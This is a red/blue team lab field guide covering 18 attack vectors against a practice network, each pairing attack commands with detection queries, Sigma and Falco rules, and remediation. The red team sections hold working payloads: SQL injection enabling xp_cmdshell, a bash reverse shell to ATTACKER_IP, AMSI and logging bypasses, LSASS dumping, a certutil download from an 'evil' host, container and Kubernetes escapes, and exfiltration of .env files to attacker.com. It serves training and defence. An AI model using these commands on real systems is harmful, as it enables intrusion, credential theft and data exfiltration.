# 📓 MODERN KILL LAB: OPERATOR'S FIELD GUIDE

This guide covers **18 attack vectors** with instructions for both:
- 🔴 **Red Team:** Exploitation steps
- 🔵 **Blue Team:** Detection, hunting, and response

---

# PART 1: IDENTITY & WEB ATTACKS

---

## 🛑 VECTOR 1: SQL Injection

**Target:** `http://10.0.0.10/hr_portal` | **Difficulty:** 🟢 Easy

### 🔴 Red Team

**1. Test for Vulnerability:**
```
http://10.0.0.10/hr_portal/index.php?id=1'
```
Error or blank page = vulnerable.

**2. UNION Injection:**
```
?id=1 UNION SELECT @@version, user_name()
```

**3. Enable xp_cmdshell:**
```
?id=1; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--
?id=1; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
?id=1; EXEC xp_cmdshell 'whoami';--
```

### 🔵 Blue Team

**Detection - Event Logs:**
```powershell
# SQL Server error logs
Get-EventLog -LogName Application -Source "MSSQL*" -Newest 50 | Where-Object {$_.Message -like "*error*"}
```

**Detection - SQL Audit:**
```sql
-- Enable SQL Server Audit
CREATE SERVER AUDIT SQLInjectionAudit TO FILE (FILEPATH = 'C:\SQLAudit\');
ALTER SERVER AUDIT SQLInjectionAudit WITH (STATE = ON);
```

**Indicators of Compromise:**
- `UNION SELECT` in URL parameters
- `xp_cmdshell` execution
- `sp_configure` changes
- SQL errors in web responses

**Sigma Rule:**
```yaml
title: SQL Injection Attempt
logsource:
  product: windows
  service: application
detection:
  selection:
    Provider_Name: 'MSSQLSERVER'
    Message|contains:
      - 'UNION'
      - 'xp_cmdshell'
      - "'"
  condition: selection
```

**Remediation:**
1. Use parameterized queries
2. Remove `xp_cmdshell` permissions
3. Implement WAF rules
4. Least privilege for SQL accounts

---

## 🤖 VECTOR 2: AI Prompt Injection / RCE

**Target:** `http://10.0.0.20:5000` | **Difficulty:** 🟢 Easy

### 🔴 Red Team

**1. Test Command Execution:**
```
http://10.0.0.20:5000/ask?query=id
http://10.0.0.20:5000/ask?query=cat /etc/passwd
```

**2. Reverse Shell:**
```
http://10.0.0.20:5000/ask?query=bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

**3. Steal Kubeconfig:**
```
http://10.0.0.20:5000/ask?query=cat /home/vagrant/.kube/config
```

### 🔵 Blue Team

**Detection - Process Monitoring:**
```bash
# Monitor processes spawned by Python
auditctl -a always,exit -F arch=b64 -S execve -F ppid=$(pgrep -f app.py) -k ai_rce

# Search audit logs
ausearch -k ai_rce
```

**Detection - Network:**
```bash
# Monitor outbound connections from AI service
ss -tunap | grep python
netstat -anp | grep :5000
```

**Indicators of Compromise:**
- Shell commands in HTTP query parameters
- Python process spawning `/bin/bash`, `/bin/sh`
- Unexpected outbound connections from web process
- Access to sensitive files (`/etc/passwd`, `.kube/config`)

**Remediation:**
1. Never pass user input to `shell=True`
2. Use allowlist for AI commands
3. Run service as non-root
4. Implement input sanitization

---

## 🔨 VECTOR 3: AS-REP Roasting

**Target:** `svc_backup` account | **Difficulty:** 🟢 Easy

### 🔴 Red Team

**1. Enumerate Vulnerable Accounts:**
```bash
GetNPUsers.py LAB.local/ -usersfile users.txt -format hashcat -dc-ip 10.0.0.10
```

**2. Target Known Account:**
```bash
GetNPUsers.py LAB.local/svc_backup -no-pass -dc-ip 10.0.0.10 -format hashcat
```

**3. Crack Hash:**
```bash
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```
**Password:** `Backup2024!`

### 🔵 Blue Team

**Detection - Event ID 4768:**
```powershell
# Kerberos TGT requests without preauth
Get-WinEvent -FilterHashtable @{
    LogName='Security'
    Id=4768
} | Where-Object { $_.Properties[4].Value -eq '0x0' } | Select-Object TimeCreated, @{N='Account';E={$_.Properties[0].Value}}
```

**Detection - Honey Account:**
```powershell
# Create honey account that alerts on any auth attempt
New-ADUser -Name "svc_honey" -DoesNotRequirePreAuth $true
# Monitor Event ID 4768 for this account specifically
```

**Indicators of Compromise:**
- Event ID 4768 with PreAuth Type = 0
- Multiple TGT requests for service accounts
- Requests from non-standard IPs

**Sigma Rule:**
```yaml
title: AS-REP Roasting Attempt
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4768
    PreAuthType: '0'
    TargetUserName|endswith:
      - 'svc_'
      - '_svc'
  condition: selection
```

**Remediation:**
1. Enable Kerberos preauth for all accounts
2. Use strong passwords (25+ chars)
3. Monitor service account authentication
4. Implement honey accounts

---

## 🎫 VECTOR 4: Kerberoasting

**Target:** `svc_sql` (has SPN) | **Difficulty:** 🟢 Easy

### 🔴 Red Team

**1. Find Kerberoastable Accounts:**
```bash
GetUserSPNs.py LAB.local/helpdesk:Help123! -dc-ip 10.0.0.10
```

**2. Request TGS:**
```bash
GetUserSPNs.py LAB.local/helpdesk:Help123! -dc-ip 10.0.0.10 -request -outputfile tgs.hash
```

**3. Crack:**
```bash
hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt
```
**Password:** `Password123!`

### 🔵 Blue Team

**Detection - Event ID 4769:**
```powershell
# TGS requests with RC4 encryption (weak)
Get-WinEvent -FilterHashtable @{
    LogName='Security'
    Id=4769
} | Where-Object { 
    $_.Properties[5].Value -eq '0x17' -and  # RC4
    $_.Properties[6].Value -ne '0x0'        # Success
}
```

**Detection - Honey SPN:**
```powershell
# Create honey service account
New-ADUser -Name "svc_honeypot" -ServicePrincipalNames "HTTP/honeypot.lab.local"
# Any TGS request for this SPN is malicious
```

**Indicators of Compromise:**
- Event ID 4769 with encryption type 0x17 (RC4)
- Single user requesting TGS for multiple SPNs
- TGS requests from non-service hosts

**Sigma Rule:**
```yaml
title: Kerberoasting Activity
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4769
    TicketEncryptionType: '0x17'
    ServiceName|endswith: '$'
  filter:
    ServiceName|endswith: 'krbtgt'
  condition: selection and not filter
```

**Remediation:**
1. Use Group Managed Service Accounts (gMSA)
2. Enforce AES encryption
3. Strong passwords for service accounts
4. Monitor SPN enumeration

---

## ☁️ VECTOR 5: Hybrid Identity Attack

**Target:** Azure AD Sync config | **Difficulty:** 🟡 Medium

### 🔴 Red Team

**1. Locate Config:**
```powershell
Get-ChildItem "C:\Program Files\Azure AD Sync\" -Recurse
type "C:\Program Files\Azure AD Sync\connection.xml"
```

**2. Extract Credential:**
```xml
<PasswordEncrypted>VABhAGwAbABoAGEAbABsAGEAMQAyADMAIQ==</PasswordEncrypted>
```

**3. Decode:**
```powershell
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("VABhAGwAbABoAGEAbABsAGEAMQAyADMAIQ=="))
```
**Password:** `Valhalla123!`

### 🔵 Blue Team

**Detection - File Access:**
```powershell
# Enable auditing on Azure AD Sync folder
$acl = Get-Acl "C:\Program Files\Azure AD Sync"
$rule = New-Object System.Security.AccessControl.FileSystemAuditRule("Everyone","Read","Success")
$acl.AddAuditRule($rule)
Set-Acl "C:\Program Files\Azure AD Sync" $acl

# Monitor Event ID 4663
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4663} | 
    Where-Object {$_.Message -like "*Azure AD Sync*"}
```

**Detection - Process Monitoring:**
```powershell
# Alert on Base64 decoding of known strings
# Monitor PowerShell for FromBase64String calls
```

**Indicators of Compromise:**
- Access to `connection.xml` or `.mdf` files
- Base64 decoding in PowerShell
- Lateral movement using `svc_adsync` account

**Remediation:**
1. Encrypt sensitive configs with DPAPI
2. Restrict access to AD Connect server
3. Monitor sync account usage
4. Use managed identities where possible

---

## 🛡️ VECTOR 6: AD CS Relay (ESC8)

**Target:** Certificate Authority | **Difficulty:** 🟡 Medium

### 🔴 Red Team

**1. Verify HTTP Enrollment:**
```bash
curl -I http://10.0.0.10/certsrv/
# 401 with WWW-Authenticate: NTLM = Vulnerable
```

**2. Setup Relay:**
```bash
# Terminal 1: Responder (without HTTP/SMB)
sudo responder -I eth0 -rdw

# Terminal 2: NTLMRelayx
ntlmrelayx.py -t http://10.0.0.10/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

**3. Trigger Authentication:**
```sql
-- Via SQLi
EXEC xp_cmdshell 'ping ATTACKER_IP'
```

**4. Use Certificate:**
```bash
# Authenticate as DC
Rubeus.exe asktgt /user:DC01$ /certificate:cert.pfx /ptt
```

### 🔵 Blue Team

**Detection - Certificate Events:**
```powershell
# Event ID 4886 - Certificate request
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4886} |
    Where-Object {$_.Properties[1].Value -like "*DomainController*"}

# Event ID 4887 - Certificate issued
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4887}
```

**Detection - Network:**
```powershell
# Monitor HTTP traffic to /certsrv
# Look for NTLM authentication from unexpected sources
```

**Indicators of Compromise:**
- Certificate requests from non-standard hosts
- Machine account requesting user templates
- HTTP NTLM auth to CA from external IPs

**Remediation:**
1. Enable HTTPS (require SSL) on CA web enrollment
2. Enable EPA (Extended Protection for Authentication)
3. Disable web enrollment if not needed
4. Restrict certificate templates

---

# PART 2: DEFENSE EVASION & IN-MEMORY

---

## 🛡️ VECTOR 7: AMSI Bypass

**Target:** PowerShell AMSI | **Difficulty:** 🟡 Medium

### 🔴 Red Team

**1. Check AMSI Status:**
```powershell
'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'
# If blocked, AMSI is active
```

**2. Bypass via Reflection:**
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

**3. Bypass via Registry (Lab has weak ACLs):**
```powershell
Remove-Item "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\*" -Recurse
```

### 🔵 Blue Team

**Detection - Registry Monitoring:**
```powershell
# Monitor AMSI provider key
$query = "SELECT * FROM RegistryTreeChangeEvent WHERE Hive='HKEY_LOCAL_MACHINE' AND RootPath='SOFTWARE\\Microsoft\\AMSI'"
Register-WmiEvent -Query $query -Action { Write-Warning "AMSI Registry Modified!" }
```

**Detection - PowerShell Logging:**
```powershell
# Look for AMSI bypass patterns in ScriptBlock logs
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104} |
    Where-Object {$_.Message -match 'AmsiUtils|amsiInitFailed|AmsiScanBuffer'}
```

**Indicators of Compromise:**
- References to `AmsiUtils`, `amsiInitFailed`
- AMSI provider registry modifications
- `AmsiScanBuffer` patching

**Sigma Rule:**
```yaml
title: AMSI Bypass Attempt
logsource:
  product: windows
  service: powershell
detection:
  selection:
    EventID: 4104
    ScriptBlockText|contains:
      - 'AmsiUtils'
      - 'amsiInitFailed'
      - 'AmsiScanBuffer'
  condition: selection
```

---

## 🔒 VECTOR 8: VEH/EDR Bypass

**Target:** FakeEDR.exe | **Difficulty:** 🔴 Hard

### 🔴 Red Team

**1. Identify VEH Hooks:**
```c
// Walk VEH chain
// Check for EDR DLLs in process
```

**2. Remove Handler:**
```c
RemoveVectoredExceptionHandler(handlerAddress);
```

**3. Clear Hardware Breakpoints:**
```c
CONTEXT ctx;
ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
GetThreadContext(hThread, &ctx);
ctx.Dr0 = ctx.Dr1 = ctx.Dr2 = ctx.Dr3 = ctx.Dr7 = 0;
SetThreadContext(hThread, &ctx);
```

### 🔵 Blue Team

**Detection - API Monitoring:**
```
Monitor calls to:
- RemoveVectoredExceptionHandler
- SetThreadContext with CONTEXT_DEBUG_REGISTERS
- NtSetContextThread
```

**Detection - Process Integrity:**
```powershell
# Check for missing EDR hooks
# Compare loaded DLLs against baseline
```

**Indicators of Compromise:**
- EDR process crash/termination
- Debug register manipulation
- VEH handler list modification

---

## 💉 VECTOR 9: Reflective Code Injection

**Target:** VulnerableLoader.exe | **Difficulty:** 🔴 Hard

### 🔴 Red Team

**1. Create Payload:**
```csharp
// payload.cs
using System;
class P { static void Main() { System.Diagnostics.Process.Start("calc"); }}
```

**2. Inject:**
```powershell
$bytes = [IO.File]::ReadAllBytes("payload.exe")
[Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null,$null)
```

### 🔵 Blue Team

**Detection - Module Loads:**
```powershell
# Sysmon Event ID 7 - Image Loaded
# Look for .NET assemblies loaded from memory (no file path)
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';Id=7} |
    Where-Object {$_.Message -notlike "*C:\*"}
```

**Detection - ETW:**
```powershell
# Monitor Assembly.Load events via CLR ETW
# Microsoft-Windows-DotNETRuntime provider
```

**Indicators of Compromise:**
- Assembly loaded without file backing
- `Assembly.Load(byte[])` calls
- .NET runtime events from unexpected processes

---

## 👻 VECTOR 10: Process Hollowing

**Target:** System processes | **Difficulty:** 🔴 Hard

### 🔴 Red Team

**1. Create Suspended Process:**
```c
CreateProcess("notepad.exe", ..., CREATE_SUSPENDED, ...);
```

**2. Hollow & Inject:**
```c
NtUnmapViewOfSection(hProcess, pImageBase);
VirtualAllocEx(...);
WriteProcessMemory(...);
SetThreadContext(...);
ResumeThread(...);
```

### 🔵 Blue Team

**Detection - Sysmon:**
```powershell
# Event ID 1 - Process Create
# Look for suspicious parent-child relationships
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';Id=1} |
    Where-Object {
        $_.Properties[20].Value -like "*notepad*" -and
        $_.Properties[3].Value -notlike "*explorer*"
    }
```

**Detection - Memory:**
```powershell
# Compare process memory to disk image
# Detect PEB.ImageBaseAddress mismatch
```

**Indicators of Compromise:**
- Process with mismatched memory vs disk image
- Suspended process creation followed by memory writes
- `NtUnmapViewOfSection` calls

---

## 🔑 VECTOR 11: Credential Dumping

**Target:** Multiple sources | **Difficulty:** 🟡 Medium

### 🔴 Red Team

**1. Credential Manager:**
```powershell
cmdkey /list
# Use Mimikatz: vault::cred
```

**2. SAM/SYSTEM:**
```bash
secretsdump.py -sam SAM.bak -system SYSTEM.bak LOCAL
```

**3. LSASS:**
```cmd
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> dump.dmp full
```

### 🔵 Blue Team

**Detection - LSASS Access:**
```powershell
# Sysmon Event ID 10 - Process Access
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';Id=10} |
    Where-Object {$_.Properties[8].Value -like "*lsass*"}
```

**Detection - Registry Access:**
```powershell
# Event ID 4656 - Handle to SAM/SECURITY
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4656} |
    Where-Object {$_.Properties[5].Value -match 'SAM|SECURITY'}
```

**Sigma Rule:**
```yaml
title: LSASS Memory Access
logsource:
  product: windows
  service: sysmon
detection:
  selection:
    EventID: 10
    TargetImage|endswith: '\lsass.exe'
    GrantedAccess|contains:
      - '0x1010'
      - '0x1038'
  condition: selection
```

**Remediation:**
1. Enable Credential Guard
2. Configure LSA Protection (RunAsPPL)
3. Restrict debug privileges
4. Monitor credential access events

---

## 🦎 VECTOR 12: LOLBin Execution

**Target:** Native Windows binaries | **Difficulty:** 🟢 Easy

### 🔴 Red Team

**MSBuild:**
```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\Tools\LOLBinLab\payload.csproj
```

**Certutil:**
```cmd
certutil -urlcache -split -f http://evil/payload.exe payload.exe
```

**MSHTA:**
```cmd
mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""calc"":close")
```

### 🔵 Blue Team

**Detection - Process Command Lines:**
```powershell
# Sysmon Event ID 1
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';Id=1} |
    Where-Object {
        $_.Properties[4].Value -match 'msbuild|certutil|mshta|wmic|rundll32' -and
        $_.Properties[10].Value -match 'http|urlcache|javascript'
    }
```

**Sigma Rule:**
```yaml
title: LOLBin Suspicious Execution
logsource:
  product: windows
  service: sysmon
detection:
  selection_certutil:
    Image|endswith: '\certutil.exe'
    CommandLine|contains:
      - 'urlcache'
      - 'decode'
  selection_msbuild:
    Image|endswith: '\msbuild.exe'
    CommandLine|contains: '.csproj'
  condition: selection_certutil or selection_msbuild
```

---

## 📊 VECTOR 13: ETW/Logging Bypass

**Target:** PowerShell logging | **Difficulty:** 🟡 Medium

### 🔴 Red Team

**Disable ScriptBlock Logging:**
```powershell
$settings = [Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static')
$gpo = $settings.GetValue($null)
$gpo['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
```

**Patch ETW:**
```powershell
# Patch ntdll!EtwEventWrite
```

### 🔵 Blue Team

**Detection - Logging Gaps:**
```powershell
# Monitor for gaps in expected logging
# Alert when ScriptBlock events stop
```

**Detection - Integrity:**
```powershell
# Check ETW provider registration
logman query providers | findstr PowerShell
```

**Remediation:**
1. Use protected event log forwarding
2. Monitor logging health
3. Implement tamper detection
4. Use multiple log sources

---

## 🔄 VECTOR 14: Persistence

**Target:** Scheduled Tasks | **Difficulty:** 🟡 Medium

### 🔴 Red Team

**Find Hidden Task:**
```powershell
Get-ScheduledTask -TaskName "WindowsDefenderUpdate"
```

**Create New Persistence:**
```powershell
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-enc <BASE64>"
$trigger = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -TaskName "Updater" -Action $action -Trigger $trigger
```

### 🔵 Blue Team

**Detection - Event ID 4698:**
```powershell
# New scheduled task created
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4698}
```

**Detection - Task Enumeration:**
```powershell
# Baseline and compare
Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "\Microsoft\*"} |
    Select-Object TaskName, TaskPath, State
```

**Sigma Rule:**
```yaml
title: Suspicious Scheduled Task Creation
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4698
  filter:
    TaskContent|contains:
      - 'Microsoft'
      - 'Windows'
  condition: selection and not filter
```

---

# PART 3: LINUX & CONTAINERS

---

## 🐳 VECTOR 15: Container Escape

**Target:** Docker containers | **Difficulty:** 🟡 Medium

### 🔴 Red Team

**Privileged Container:**
```bash
docker exec -it vuln_privileged bash
mount /dev/sda1 /mnt
chroot /mnt
```

**Docker Socket:**
```bash
docker exec -it vuln_hostsock bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host
```

### 🔵 Blue Team

**Detection - Falco Rules:**
```yaml
- rule: Container Escape via Mount
  desc: Detect mount of host filesystem
  condition: container and evt.type=mount and evt.arg.target=/mnt
  output: "Container escape attempt (container=%container.name mount=%evt.arg.target)"
  priority: CRITICAL
```

**Detection - Audit:**
```bash
# Monitor mount syscalls in containers
auditctl -a always,exit -F arch=b64 -S mount -k container_escape
```

**Remediation:**
1. Never use `privileged: true`
2. Never mount Docker socket
3. Use seccomp/AppArmor profiles
4. Implement Pod Security Standards

---

## ☸️ VECTOR 16: Kubernetes Attacks

**Target:** K3s cluster | **Difficulty:** 🟡 Medium

### 🔴 Red Team

**Enumerate Permissions:**
```bash
kubectl auth can-i --list --as=system:serviceaccount:default:vuln-admin-sa
```

**Extract Secrets:**
```bash
kubectl get secrets -A -o yaml --as=system:serviceaccount:default:vuln-admin-sa
```

**Deploy Privileged Pod:**
```bash
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: pwned
spec:
  serviceAccountName: vuln-admin-sa
  hostPID: true
  hostNetwork: true
  containers:
  - name: pwned
    image: ubuntu
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host
  volumes:
  - name: host
    hostPath:
      path: /
EOF
```

### 🔵 Blue Team

**Detection - Audit Logs:**
```bash
# Check K8s audit logs for suspicious activity
grep -E "(secrets|exec|privileged)" /var/log/kubernetes/audit.log
```

**Detection - Falco:**
```yaml
- rule: Privileged Pod Created
  desc: Detect privileged pod creation
  condition: kevt and pod and kcreate and ka.req.pod.containers.privileged=true
  output: "Privileged pod created (user=%ka.user.name pod=%ka.target.name)"
  priority: WARNING
```

**Remediation:**
1. Implement RBAC least privilege
2. Enable Pod Security Admission
3. Use network policies
4. Audit ServiceAccount usage

---

## 🐧 VECTOR 17: Linux Privilege Escalation

**Target:** sudo/capabilities | **Difficulty:** 🟢 Easy

### 🔴 Red Team

**Sudo vim:**
```bash
sudo vim -c ':!/bin/bash'
```

**Python Capabilities:**
```bash
/usr/local/bin/python_cap -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### 🔵 Blue Team

**Detection - Audit:**
```bash
# Monitor sudo usage
auditctl -a always,exit -F arch=b64 -S execve -F euid=0 -k privilege_escalation
ausearch -k privilege_escalation
```

**Detection - SUID/Capabilities:**
```bash
# Baseline and alert on changes
find / -perm -4000 -type f 2>/dev/null > /tmp/suid_baseline
getcap -r / 2>/dev/null > /tmp/caps_baseline
```

**Remediation:**
1. Audit sudo configurations
2. Remove unnecessary SUID bits
3. Review capability assignments
4. Use sudoers with command restrictions

---

## 📤 VECTOR 18: Data Exfiltration

**Target:** Sensitive files | **Difficulty:** 🟢 Easy

### 🔴 Red Team

**DNS Exfil:**
```bash
data=$(cat /home/vagrant/exfil_lab/.env | base64)
nslookup $data.attacker.com
```

**HTTP Exfil:**
```bash
curl -X POST -d @/home/vagrant/exfil_lab/.env http://attacker.com/collect
```

### 🔵 Blue Team

**Detection - Network:**
```bash
# Monitor for large DNS queries
tcpdump -i any port 53 -w dns_capture.pcap
# Analyze for tunneling
```

**Detection - File Access:**
```bash
# Monitor sensitive file access
auditctl -w /home/vagrant/exfil_lab/.env -p r -k exfil_attempt
```

**Remediation:**
1. Implement DLP solutions
2. Monitor egress traffic
3. Detect DNS tunneling
4. Encrypt sensitive data at rest

---

# APPENDIX: BLUE TEAM QUICK REFERENCE

## Critical Event IDs

| Event ID | Source | Description |
|----------|--------|-------------|
| 4624 | Security | Successful logon |
| 4625 | Security | Failed logon |
| 4648 | Security | Explicit credential logon |
| 4656 | Security | Handle to object |
| 4663 | Security | Object access attempt |
| 4688 | Security | Process creation |
| 4698 | Security | Scheduled task created |
| 4768 | Security | Kerberos TGT request |
| 4769 | Security | Kerberos TGS request |
| 4104 | PowerShell | ScriptBlock logging |
| 1 | Sysmon | Process creation |
| 7 | Sysmon | Image loaded |
| 10 | Sysmon | Process access |

## Detection Tools Setup

**Install Sysmon:**
```powershell
choco install sysmon
sysmon -accepteula -i sysmonconfig.xml
```

**Install auditd (Linux):**
```bash
apt install auditd
systemctl enable auditd
```

**Install Falco (K8s):**
```bash
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm install falco falcosecurity/falco
```

---

*End of Guide. Hunt well.* 🎯
